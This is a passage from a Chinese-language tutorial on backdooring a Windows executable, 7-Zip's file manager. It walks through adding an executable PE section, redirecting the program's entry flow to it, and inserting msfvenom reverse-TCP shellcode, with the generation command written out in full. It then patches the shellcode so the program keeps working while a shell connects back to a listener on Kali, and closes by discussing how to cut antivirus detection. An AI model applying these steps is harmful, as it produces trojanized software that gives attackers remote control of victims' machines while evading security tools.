**6\. 添加新的Section Header方法**
此方法的大体思路是： **先在PE文件中创建一个新的Section
Header，随后在新创建的Section中注入我们的Shellcode，最后再将该部分的执行流指向它。**
我们可以通过LordPE等工具，来创建新的Section Header：
打开LordPE，转到“Section Header”，并在最下面添加我们的Section Header（这里是.hello）。
将 **VirtualSize** 和 **RawSize** 增加0x1000字节，也就是4096字节。
确保我们的Section Header是可执行的。由于我们要把Shellcode放在这里，因此必须确保它是 **可执行、可读、可写的。**
保存该文件。
现在如果我们执行该文件，是不会正常运行的。因为我们已经添加了一个1000h字节的新Section， **但其Section Header是空的。**
由于现在，该文件已经包含了1000h字节的Section
Header，但该Section是空的。为了使文件能正常工作，我们就必须在文件的末尾添加1000h字节。我们可以使用任意值来填入，在这里我们使用了null值（00）。借助任何16进制编辑器，都可以在文件的末尾添加1000h字节，如下所示：
至此，我们已经在文件末尾添加了null值，并将修改后的文件重命名为 **7zFMAddedSection.exe**
。在进行下一步之前，我们必须确保修改后的 **7zFMAddedSection.exe**
文件是能够正常工作的，同时也要保证新的Section具有足够的权限。我们可以在Ollydbg中，通过查看“Memory Section”和“PE
headers”来进行检查。
**6.1劫持执行流**
我们可以看到，新的Section .hello已经具有了足够的权限。 **接下来要做的就是将程序的执行流劫持到我们新添加的.hello
Section处。**
当该程序运行时，它应该指向.hello对应的代码部分，也就是我们放置Shellcode的地方。在这里，请记下前五个操作码，我们在恢复执行流时还需要再次用到。
在Ollydbg中打开后，复制.hello Section的起始地址0047E000，并将位于004538D8地址的第一个操作码替换成 **JMP** 到
**0047E000** **。**
随后我们保存该文件，其具体操作为：右键点击 -> Copy to executable（复制到可执行文件） -> all
modifications（所有修改） -> Save
file（保存文件）。我们在这里将文件名另存为7zFMAddedSectionHijacked.exe。
**至此，我们成功添加了一个新的Section Header，并劫持了执行流。**
接下来，在Ollydbg中打开7zFMAddedSectionHijacked.exe文件。我们希望执行流重定向到我们新添加的.hello
Section，其中包含的都是null值。
现在我们就有了一个很长的空Section，后面要做的便是在该Section中添加我们的Shellcode，以便在执行文件时能够触发它。
**6.2 添加Shellcode**
如之前所述，我们将使用Metasploit的stageless Windows/shell_reverse_tcp
Shellcode。在这里，我们之所以不使用msfvenom提供的任何编码方案，是因为其中的大多数都已经被反病毒软件标记。
**为了添加Shellcode，首先我们要将寄存器放到栈上，并使用PUSHAD和PUSHHD操作来存储它们的状态。**
在Shellcode结束时，我们弹出寄存器，并通过粘贴此前复制的程序指令的方式来恢复执行流。这样就可以确保7zip的正常功能不受影响。
下面是指令的顺序：
    PUSHAD
    PUSHFD
    Shellcode....
    POPAD
    POPFD
    Restore Execution Flow...
我们在mfsvenom中，使用以下参数，生成Windows Stageless反向Shellcode：
    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.116.128 LPORT=8080 -a x86 --platform windows -f hex
我们先复制Shellcode，随后在Ollydbg中粘贴的操作是：右键点击 > binary > binary paste，这样就可以得到相应的汇编代码。
**6.3 修改Shellcode**
现在，我们已经将反向TCP的Shellcode加入到.hello Section之中，但还要对我们的Shellcode进行一些修改：
  * 在Shellcode的末尾，我们可以看到一个CALL EBP的操作，它会在Shellcode执行结束后终止程序的运行。但恰恰相反， **我们希望程序在Shellcode执行后还能正常运行，所以需要将操作码CALL EBP改为NOP（No Operation，无操作）。**
  * 另一处需要做改动的地方是由于我们的Shellcode中存在一个WaitForSignleObject。WaitForSignleObject函数中的一个参数以毫秒作为单位，会在开始其它线程前等待该参数所定义的时间。如果WaitForSignleObject函数的参数为-1，则代表在其他线程启动之前，将等待无限长的时间。这就意味着，当我们执行该程序时，会产生一个反向Shell，但在关闭我们的反向Shell之前，7zip的正常功能会一直停止。关于如何查找和修复WaitForSignleObject，可以参考：[https://simonuvarov.com/msfvenom-reverse-tcp-waitforsingleobject/](https://simonuvarov.com/msfvenom-reverse-tcp-waitforsingleobject/) 。
  * 在这里，我们只需要在NOP之前，将DEC INC操作码的值修改为-1，就可以实现上述内容。
  * 还有，我们需要使用POPFD和POPAD来弹出寄存器的值，以供后面恢复时使用。
  * 在POPFD和POPAD之后，我们需要添加5个早先在劫持执行流时复制的指令，以确保在执行完Shellcode后还能执行7zip的正常功能。
  * 我们将上述改动另存为7zFMAddedSectionHijackedShelled.exe。
**6.4 监听Shell**
在Kali
Box上设置一个监听器，随后执行7zFMAddedSectionHijackedShelled.exe。最终我们运行的文件就是一个近乎完美的成品，既完整保留了原有功能，同时也得到了想要的Shell。
让我们来看看检测结果如何。  
从检测结果来看，并不是很好。其主要原因在于我们使用的是一个已知的Metasploit
Shellcode，并且没有经过任何编码。如果需要，我们可以对这一点再进行改进。
**6.5 此方法的优点**
此方法的优点在于，我们可以创建较大的Section
Header，大空间的好处就在于不用担心Shellcode占用的空间，就算是编码若干次后，也能放心地注入。这一点就可以帮助绕过反病毒检测。
**6.6 此方法的缺点**
添加新的Section Header并赋予其可执行权限可能会触发防病毒告警。
此外，这种方法还会增加原始文件的大小，杀毒软件或者目标主机的用户有可能会通过文件大小的不同而发现异常。
反病毒软件的检测率相对较高。
在这里，我们要请大家特别留意创建Section Header方式的缺点。考虑到这些缺点，我们当前的这一方法距离“完全无法检测”的目标，还差得很远。
那么，在下篇中，我们将研究两种其他的方法，以帮助我们提升可用性，并有效降低后门的被检测概率，敬请阅读。